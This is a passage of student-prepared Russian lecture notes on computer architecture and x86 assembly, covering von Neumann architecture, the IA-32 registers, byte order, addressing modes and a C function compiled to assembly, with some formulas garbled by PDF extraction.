                                                                     ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                      СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




Зачем нужен язык ассемблера
   • Язык ассемблера позволяет понимать поведение машины

   • Системное программное обеспечение создается людьми, в том числе выпускниками
     ВМК

            – Компиляторы и многие другие инструменты разработки программ
            – Операционные системы
            – Средства защиты информации

   • Отладка ошибок разработчиком программы

   • Настройка производительности программы

            – Почему оптимизация программы компилятором не дает ожидаемого
              результата

   • Безопасность программного обеспечения (software security, cyber security)

            – Сертификация программ
            – Средства защиты
            – Вредоносный код: ботнеты, вирусы/черви, руткиты, и т.д.


История первых компьютеров
   • Чарлз Бэббидж, Ада Лавлайс 1820-1833

   • Конрад фон Цузе

            – Z1 1938г., Z2 1939 г., Z3 1941г., Z4 1945г.

   • Экерт и Моучли

            – ENIAC 1946 г.
            – фон Нейман

                      * First Draft of a Report on the EDVAC, 30 июня 1945
   • Атанасов и Берри

            – ABC 1942 г.

   • Mark I

            – 1949 г.


                                                   14
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                    КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                         ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                          СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




   • Исаак Брук

            – М-1 1951 г.

   • Сергей Лебедев

            – МЭСМ 1950 г.
            – БЭСМ-1 1952 г.

   Применение первых компьютеров:

   • задачи математической физики

   • шифрование/дешифрование сообщений

   • управление (военной) техникой

   Современное применение компьютеров:

   • хранение информации и предоставление удобного доступа для работы с ней

   • игры

   • передача информации

   • управление технологическими процессами

   • работа со всем, что нас окружает


Архитектура фон Неймана
   Рассмотрим принципы фон Неймана. Первый принцип – информация хранится в
двоичном виде. Пусть есть некоторое физическое механическое устройство, которое
хранит в себе один бит информации. Например, пусть есть некоторое основание, на
котором расположен шарнир. Укрепленная на этом механизме штанга может находиться
только в одном конкретном положении (принимать только одно определенное значение).
Если взять достаточное количество подобных устройств, мы сможем хранить нужный
объем информации в виде вектора подобных устройств. Однако, такие устройства
большие, работа с ними неудобна. Более того, нужно уметь быстро перезаписывать,
считывать информацию и др., поэтому подобная система оказывается неудобной. На
смену механической модели приходит электрическая. Данная модель компактна и с нее
удобно считывать.
   Все данные и команды, с которыми мы работаем, записываются в оперативной памяти.
То есть, есть некоторое запоминающее устройство, где все хранится. Данное устройство
можно условно представить в виде некоторого массива элементов. Однако данные


                                        15
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                                  КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                       ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                        СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




элементы – не отдельные биты, а, например, октеты (то есть байты). Соответственно
запись в виде двоичной информации удобно делать не в виде последовательности нулей
и единиц, а в шестнадцатиричном виде. Тогда вектор принимает более компактный вид,
с которым удобно работать.
    Отметим, что физическая память физически разделена с тем, где происходят
вычисления. Сообщения между процессором и памятью осуществляется через шину.
В процессоре можно выделить две основных компоненты – управляющее устройство
(руководит ходом работы процессора) и арифметико-логическое устройство (выполняет
преобразование информации). Для локального хранения используют регистры.



                                     регистры
                                                           шина оперативная
                                                                   память

                                     уу         АЛУ

                                          ЦПУ

                                  Рис. 1.2: Иллюстрация к объяснению

   Чтобы забрать или вызвать что-то из оперативной памяти, нужно через шину указать
адрес – номер ячейки. При этом потенциальная адресуемость всегда соответствует
некоторой степени двойки.
   Команды выполняются (по умолчанию) последовательно. Пусть где-то в памяти
лежат числа: 89 С8 8b 15 .. Внутри управляющего устройства есть служебный регистр
– счетчик команд – в котором хранится адрес текущей команды, которую он хочет
выполнить. Согласно значению счетчика команд, процессор получает числа, разбирается,
какой команде соответствуют данные числа, после чего счетчик команд передвигается на
следующую адресуемую величие и продолжает выполнение.
   Обращение к регистру выполняется с помощью имен. На самом деле машина никаких
имен не знает. В коде команды есть определённая группа битов, которой соответствует
определённый регистр. Однако для человека такая запись неудобна, поэтому существует
также текстовая запись. Ниже представлены две формы записи одних и тех же команд:
89 c8             | mov eax , ecx
8b 15 20 20 00 00 | mov edx , dword [0 x2021 ]
c7 03 41 00 00 00 | mov dword [ ebx ], 'A'
   Поэтому любая ассемблерная команда имеет следующую структуру: КОП (код
операции), ОП1, ОП2 . . . (последовательность операндов).
   Также в команде в виде операнда может встретиться некоторая константная величина
или то, что кодируется непосредственно в теле самой команды (см. третью строку
приведенного выше примера).


                                                      16
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                             КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                  ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                   СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




   Итак, операндами могут быть:

   • регистры

   • память

   • константы

   Таким образом, принципы фон Неймана можно записать в виде

  1. Двоичное кодирование информации

  2. Неразличимость команд и данных

  3. Адресуемость памяти

  4. Последовательное выполнение команд


Другие варианты архитектур
   Существует также так называемая гарвардская архитектура, в которой код программы
и данные, с которыми он работает, физически разнесены. В результате появляется две
шины, вследствие чего можно одновременно закачивать в процессор команду и данные.
Если появляется ошибка и мы ошибочно пишем не в то место памяти, то мы испортим
только данные (в отличие от фон Неймановской архитектуры).




                                  Рис. 1.3: Гарвардская архитектура

   Отметим также, что зачастую, говоря об архитектуре фон Неймана, указывают
систему ввода-вывода, что указано на рис. 1.4.




                                                 17
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                                 КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                      ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                       СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




                             Рис. 1.4: Вариант изображения архитектуры фон Неймана


Модельный цикл работы ЭВМ
   Процессор машины (в случае фон Неймановской архитектуры) выполняет цепочку
действий. Эти действия условно группируются на некоторое количество шагов.
Рассмотрим их:

  1. Извлечение инструкции из памяти
     Используя текущее значение счетчика команд, процессор извлекает некоторое
     количество байт из памяти и помещает их в буфер команд

  2. Декодирование команды
     Процессор просматривает содержимое буфера команд и определяет код операции и
     ее операнды. Длина декодированной команды прибавляется к текущему значению
     счетчика команд

  3. Загрузка операндов
     Извлекаются значения операндов. Если операнд размещен в ячейках памяти –
     вычисляется исполнительный адрес.

  4. Выполнение операции над данными

  5. Запись результата
     Результат может быть записан в том числе и в счетчик команд для изменения
     естественного порядка выполнения

    Рассмотрим подробнее третий пункт. Пусть есть некоторое запоминающее устройство
из восьми разрядов. В случае работы с данными значения должны быть преобразованы в
напряжения той или иной величины (см. рис. 1.5).




                                                      18
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                                     КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                          ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                           СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU



                                         0 1 0 1 0 1 1 1




                                  Рис. 1.5: Иллюстрация к объяснению


   При этом, если мы обращаемся в память, нам нужно сформировать так называемый
исполнительный адрес, то есть тот адрес, с которого у нас будет тянуться исполнение.
Этот адрес закодирован внутри команды.


Ключевые понятия и термины
   • Регистр – запоминающее устройство, которое физически присутствует
     непосредственно внутри процессора, в виде ассемблерной инструкции он
     идентифицируется по своему имени. Число элементов внутри регистра определяет
     его разрядность. ТО, что записано в регистре естественно интерпретировать в
     виде некоторого числа. В большинстве машин данных битовый вектор может
     интерпретировать разными способами.

   • Память – линейный адресуемый массив. Адресация идет кусками – байтами.
     В случае архитектуры фон Немана вне зависимости от того, по какому адресу
     мы обращаемся, время доступа (физическое время, необходимое для того, чтобы
     считать содержимое ячейки и через шину процессору) будет одинаковым. Однако
     в реальных машинах это не так (время доступа будет разным).

   • Цикл – это то, что делает машина, обрабатывая каждую команду. Тактовую
     частоту можно условно соотнести с тем, сколько таких циклов за секунду
     компьютер успевает выполнить. Счетчик команд отвечает за то, какая команда
     выполняется следующей.

   • Адресность – это то, сколько операндов записано внутри команды.

   • Исполнительный (действительный) адрес (effective (executive) address) – адрес,
     на котором проявляется некий эффект работы команды.

   Замечание. Битовый вектор, о котором говориться в первом пункте приведенного
списка, можно интерпретировать как беззнаковое число:

                                                        ∑
                                                        𝑁−1
                                            𝑈 ( 𝑥®) =         2𝑖 𝑥𝑖                                        (1.1)
                                                        𝑖=0




                                                    19
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                                        КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                             ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                              СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




или можно использовать знаковую интерпретацию:

                                                                ∑
                                                                𝑁−2
                                                𝑁−1
                                  𝑇 (®
                                     𝑥 ) = −2         𝑥 𝑁−1 +         2𝑖 𝑥𝑖                                   (1.2)
                                                                𝑖=0




                                                  20
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                                  КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                       ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                        СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




Лекция 2. Машина, на которой работает пользовательская
программа
Машина, на которой работает пользовательская программа
    Рассмотрим 32-разрядную машину, то есть машину, для адресации памяти которой
используется 32 разряда. Таким образом, доступное пространство оперативной памяти,
куда можно писать, имеет размер 4Гб. Условное изображение памяти можно представить
в виде:
                                  0                            232 − 1
                                        ...

                                      Рис. 2.1: Иллюстрация к объяснению

   Адресация в данной машине байтовая. В указанной памяти, в непрерывном массиве
программа держит все, что к ней относится (код, данные, статические и динамические
переменные и др.). Операционная система отвечает за разделение ресурсов, при этом
она делает так, что для каждой отдельно взятой пользовательской программы аппаратура
представляется в следующем виде (как будто она одна работает на процессоре и
использует оперативную память):




                                          Рис. 2.2: Aрхитектура IA-32

   Отметим, что несмотря на то, что все байты в указанных четырёх гигабайтах
потенциально адресуемы (можно обращаться к любой точке памяти), на самом деле
операционная система будет позволять обращаться только к определённым диапазонам
адресов.
   Регистры, которыми мы модем распоряжаться, 32-разрядные. Регистров общего
назначения всего восемь (см. рис. 2.3).



                                                      21
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                                          КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                               ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                                СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




                                                Рис. 2.3: Регистры

    Рассмотрим один регистр – EAX (см. рис. 2.4). Содержимое регистра – разряды,
то есть в данном случае некоторые запоминающие устройства, которые запоминают по
одному биту.
                                                                  AX

                                  𝑎 31           𝑎 16   𝑎 13 ...𝑎 8    𝑎 7 ...𝑎 0
                                          ...
                                                           AH           AL
                                         Рис. 2.4: Иллюстрация к примеру

    Ранее предполагалось, что у каждого регистра есть свае предназначение. Поэтому
вторая буква в названии регистра обозначала это предназначение. Например, буква А
в EAX, означает accumulator, B в EBX – base и так далее. Сейчас нет ограничений на
использование регистров, поэтому нет необходимости запоминать данную информацию.
    В современных процессорах регистров зачастую гораздо больше. Это удобно для
компилятора, для того, чтобы держать данные на регистрах рядом с арифметико-
логическим устройством. Чем больше регистров, тем меньше обращений в памяти. При
этом лучше делать регистры унифицированными в плане использования. Тогда их можно
комбинировать для составления сложных выражений.
    Есть пара служебных регистров, которые можно отнести к управляющему устройству
– счетчик команд (EIP) и EFLAGS (в этом регистре можно сохранять некоторые побочные
эффекты от того, как та или иная программа отработает).



                                                        22
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                           КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                 СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




Порядок размещения байт в памяти
   Пример. Рассмотрим конкретный пример из четырех команд. Рассмотрим часть кода:
mov   eax , ecx
mov   eax , dword [0 x2019 ]
add   eax , 0 xff
mov   dword [ebp -4] , eax
   Закодируем текстовую запись четырех команд (см. рис. 2.5).




                                  Рис. 2.5: Иллюстрация к примеру

   В какой-то момент времени EIP указывает на первую команду. Этой команде будет
соответствовать исполняемый адрес 2019. Далее должен запускаться некоторый такт
работы: извлечение команды, ее декодирование, получение операндов. Как только
произошло декодирование, нужно, определив размер команды, нужно переставить
счетчик команд на следующую позицию. Таким образом, после этапа декодирования
счетчик принимает значение 201B.
   В первой команде mov происходит пересылка. Отметим, что в
MOV EAX , ECX
MOV – код операции, EAX, ECX – первый и второй операнды. Возникает вопрос, в каком
порядке рассматриваются операнды. Несмотря на то, что в машине язык ассемблера один
и тот же, есть два разных синтаксиса, которые в текстовом виде описывают, что делает
команда. Первый синтаксис – Intel. В этом случае, если что-то происходит, то результат
попадает в первый операнд (в данном примере в EAX). Тогда (в данном примере) команда
MOV делает пересылку: она берет значения второго операнда (ECX) и отправляет в
первый операнд. При этом содержимое первого операнда безвозвратно утрачивается.
После копирования EAX содержит в себе тот же битовый вектор, что и ECX.
   Опишем в формульном виде то, что может быть в качестве операндов:
                                              8         8
                                   𝑀𝑂𝑉 𝑟/𝑚 16 , 𝑟/𝑚/𝑖 16 ,   
                                                           𝑚,𝑚                                  (2.1)
                                           32         32
Всего существует три типа операндов:

   • Регистр r

   • Память m


                                                  23
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                      КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                           ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                            СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




   • Константа i

   Размеры операндов:

   • byte 8

   • word 16

   • dword 32

   • qword 64

    Если речь идет о пересылке, то данные нужно отправлять куда-то данные могут быть
запомнены и сохранены, поэтому это или регистр или память. Отправлять можно из
регистра или из памяти или же использовать прямо записанную в команде константу.
После букв, которые специфицируют типы, специфицируются размеры. То есть, выше
указано, что размеров может быть три. При этом, каждый раз, когда мы берем некоторый
размер, далее (то есть после 𝑟/𝑚/𝑖) размер должен быть соответствующим (если мы
пересылаем битовые вектора, информация не может потеряться или расшириться).
    Рассмотрим вторую команду пересылки: mov eax, dword [0x2019]. Здесь операнд
назначения – EAX, а второй операнд – память. При работе с памятью нужно задавать
адрес и число извлекаемых байтов. Здесь спецификатор dword означает, что извлекается
4 байта.
    Возникает вопрос: в каком порядке в памяти расположены байты и в каком порядке
они будут составлены после пересылки? Два наиболее распространенных подхода

   • Порядок от младшего к старшему (англ. little-endian) используется в IA-32

   • Порядок от старшего к младшему (англ. big-endian) как правило используется в
     процессорах, предназначенных для обработки сетевых данных

   В данной машине используется порядок от младшего к старшему, то есть в начале идет
самый младший байт, а далее по старшинству. Таким образом, если идет пересылка, мы
просто разворачиваем список. То есть, после первой пересылки получаем значение EAX:

                                    0𝑥 19 𝑎 1 𝑐 8 89

Если бы пересылка выполнялась бы с соседнего адреса, то есть с 201В, мы бы получили:

                                     00 20 19 𝑎1

   В других процессорных архитектурах можно встретить обратный порядок следования.
Однако такое встречается очень редко, так как такой прием неудобен. Пусть есть
некоторое 32-разрядное число, которое лежит где-то в памяти. Есть некоторый адрес


                                          24
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                          КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                               ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




[x], по которому мы к нему обращаемся. Если сначала идет младший байт, то, чтобы от
32-разрядного перейти к 16-разрядному, нужно вместо dword[x] написать word[x]. То
есть получается, что тип данных сузился.


Команда сложения
   Третья команда в рассматриваемом примере – команда сложения. Запишем формат
этой команды:
                                            8          8
                                  𝐴𝐷𝐷 𝑟/𝑚   16
                                    , 𝑟/𝑚/𝑖 ,   
                                              𝑚,𝑚    16
                                 32        32
   В данном случае есть всего два регистра, причем сложение осуществляется
следующим образом:
                             ОП1 ← ОП1+ОП2

То есть то, что было в первом операнде, безвозвратно теряется.
   Таким образом, мы рассмотрели второй способ задания операнда. При этом заметим,
что сложение регистра аккумулятора кодируется кодом операции 05, а второй операнд,
который является непосредственно закодированной константой, находится дальше в теле
кода (то есть в данном примере ff 00 00 00). В тот момент, когда команда выполняется
и извлекается через шину памяти внутрь процессора, вместе с пересылкой самого тела
команды также копируется распоряжение и значение того операнда, с которым мы будем
работать.
   Отметим такое, что указанная константа будет расширена до нужной длины, прежде
чем произойдет сложение (так как складываются битовые вектора одинакового размера).
При этом битовые вектора, которые мы складываем, могут интерпретироваться как
знаковые числа или как беззнаковые числа (из-за особенностей кодирования разницы
нет).


Интерпретация конструкции с командой add с незаданным размером
   Рассмотрим команду
add eax , [x]
где x – некоторый адрес. Однако в данной конструкции не задан размер. В этом случае
программный ассемблер может посмотреть на размер первого операнда и подставить в
указанную строку спецификатор размера так, чтобы запись была корректна.
    Рассмотрим запись вида
add [x], 1
то есть мы берем некоторую память и прибавляем к ней константу. Однако в этом
случае программный ассемблер выдаст ошибку, так как в этом случае неясно, о каком



                                                 25
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                                КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                     ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                      СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




размере идет речь. Чтобы исправить это, нужно у одного из двух (или у обоих) операндов
приписать спецификатор размера.



Команда пересылки
   Ранее мы рассматривали ситуации обращения к памяти, прямо указав тот адрес, с
которого мы хотим что-то считать. Однако в последней команде рассмотренного примера
в квадратных скобках указано имя еще одного регистра (mov dword [ebp-4], eax).
Оказывается, что этот адресный код (код, который описывает операнд, с которым мы
хотим работать) может быть самым разнообразным. В общем виде конструкция внутри
квадратных скобок может быть следующая:

                                  [рег_база + масштаб*рег_индекс+смещение]

где рег_база – некоторый регистра, к которому можно прибавить рег_индекс. перед
указанными квадратными скобками должен быть спецификатор размера.
   Таким образом, при после первой пересылки осталось только смещение. В последней
же рассматриваемой команде появился регистр и смещение -4. В некоторых случаях мы не
знаем заранее, где нужно держать переменные. В этом случае нужно на ходу определять
значение некоторого регистра.


Типы адресации
   Адресация операндов:

  1. прямой

  2. непосредственный

  3. косвенная

    Прямой способ адресации был рассмотрен в примере в первой команде (напрямую
указывали имена регистров), во второй команде (напрямую указывали по имени первый
регистр и адрес той ячейки памяти. куда будем обращаться). Термин адресация определяет
то, как записывается (в двоичном коде) то, откуда мы будем брать данные.
    Непосредственный способ встретился нам в третьей команде. В теле этой команды мы
непосредственно записали значение одного из операндов.
    Косвенная адресация заключается в следующем. Сразу же после того, как команда
была декодирована, мы не знаем, с чем мы будем работать, так как необходим отдельный
этап выполнения внутри машины, когда мы сможем сформировать исполнительный адрес,
по которому будем обращаться в память. Для его формирования нужно обратиться к


                                                    26
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                             КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                  ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                   СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




регистру, считать его значение, произвести вычисление согласно указанной конструкции,
получить некоторое число (с обрезанием результатов внутри соответствующей разрядной
сетки). Таким образом, все вычисления в итоге выдают 32-разрядное число. После
получения исполнительного адреса производится считывания регистров, который
позволяет в рамках косвенной адресации задать нужное. Работа с такой адресацией
предполагает дополнительное обращение к запоминающим устройствам.
   Сопоставим способы адресации с типами операндов. В случае прямой адресации –
регистр/память, в случае непосредственной адресации – константа, в случае косвенной
адресации – память.


IA-32
   Условно развитие архитектур можно записать так: 8086 → 𝐼 𝐴 − 3 → 𝐼𝑛𝑡𝑒𝑙64.
Изначально архитектура имела вид, представленный на рис. 2.6. Далее архитектура
расширилась (рис. 2.7). Современный процессор в сильном упрощении можно
представить в виде, указанном на рис. 2.8.
   «Положительные» особенности IA-32:

   • Особенности аппаратуры и операционная система (Windows/Linux) позволяют
     использовать в программах модель плоской памяти

   • Значительно ослаблены ограничения на использование регистров в командах по
     сравнению с 8086

   • «Количественно проще» чем Intel64




                                  Рис. 2.6: Иллюстрация к объяснению




                                                 27
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                           КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                 СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




                                  Рис. 2.7: Архитектура IA-32




                                  Рис. 2.8: Архитектура Intel64


Примеры
   Рассмотрим несколько конкретных примеров. Рассмотрим следующий код на языке
Си и сопоставим ему ассемблерные команды, которые будут построены компилятором
при выполнении написанного.
void f() {
    static int cntr = 0;                         // 1


                                               28
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                     КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                          ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                           СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




     int x = 2, y = 1, z = 0;    // 2
     unsigned short w = 282;    // 3
     signed char q = 13;       // 4
     ++ cntr ;                // 5
     z = -x + q * w *y - w; // 6
}
    Полный листинг, выданный ассемблером для данной функции, будет иметь вид:
section .bss
; Резервирование 4 байт памяти
cntr resd 1
section .text
      global f
; Точка входа в программу


f:
     push ebp
     mov ebp , esp
     sub esp , 16
     mov dword [ebp -16] , 2   ;        (1)
     mov dword [ebp -12] , 1   ;        (2)
     mov dword [ebp -8] , 0    ;        (3)
     mov word [ebp -4] , 282   ;        (4)
     mov byte [ebp -1] , 13    ;        (5)
     add dword [ cntr ], 1     ;        (6)
     movsx eax , byte [ebp -1] ;        (7)
     movzx edx , word [ebp -4] ;        (8)
     imul eax , edx            ;        (9)
     imul eax , dword [ebp -12];        (10)
     sub eax , dword [ebp -16] ;        (11)
     sub eax , edx             ;        (12)
     mov dword [ebp -8] , eax ;         (13)
     leave
     ret
   Рассмотрим строки (1)-(13), так как они и будут соответствовать строкам кода 1-6.
   Каждый раз, когда появляется точка с запятой (;), все результаты в программе должны
быть зафиксированы. В отсутствие оптимизации приведенные выше операторов можно
соотнести с какими-то фиксированными командами.
   В рассматриваемом коде пять переменных, из которых четыре – автоматические и одна
статическая. Изобразим участок памяти (рис. 2.9). В некотором участке памяти должны


                                         29
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                           КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                 СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




быть размещены статические переменные, которые создаются в одном экземпляре на
весь срок работы программы. По ходу преобразования языка Си в язык ассемблера будет
несколько этапов обработки. В итоге внутри адресного кода (внутри квадратных скобок)
достаточно написать некоторое имя ([Cntr]). Позже, когда программа ассемблер будет
строить код, она преобразует символьное имя, соответствующее некоторому адресу,
в некоторое число. При этом не будет никаких пересечений с выделенными местами
для хранения переменных. Для автоматических переменных на каждый вызов где-то в




                                  Рис. 2.9: Иллюстрация к примеру

памяти должно быть выделено место. При этом пространство должно быть распределено
таким образом, чтобы эти переменные не налезали друг на друга. Это распределение за
нас делает компилятор. При этом переменные содержатся в памяти следующим образом:

    X       ebp-16
    y       ebp-12
    z       ebp-8
    w       ebp-4
    q       ebp-1
   Команда 1-5 производят инициализацию автоматических локальных переменных.
Выполнение второго оператора в коде разбивается на команды (1)-(3). В результате все
автоматические локальные переменные получат нужные значения. Рассмотрим пятую
строку кода. Оператор ++ в данном случае выражается через add. На самом деле при
выполнении данного сложения выполняется два обращения в память. Первое обращение
– когда после декодирования получаем значения операндов. Обращаемся в память на
чтение, считаем значение переменной, помещаем это значение в процессор, прибавляем
единицу, после чего новое значение отправляем по шине обратно в память.
   Выполнение шестой строки – выполнение большого выражения. Все вычисляемые
величины можно держать на регистрах как временные вспомогательные величины. После
того, как вычисления завершены, результат отправляется обратно в память.



                                                30
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                   КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                        ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                         СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




Лекция 3. Устройство ассемблерной программы
Пример
   На прошлой лекции мы рассмотрели конкретный пример работы части кода на
языке Си. Продолжим рассмотрение этого примера. В указанном участке кода были
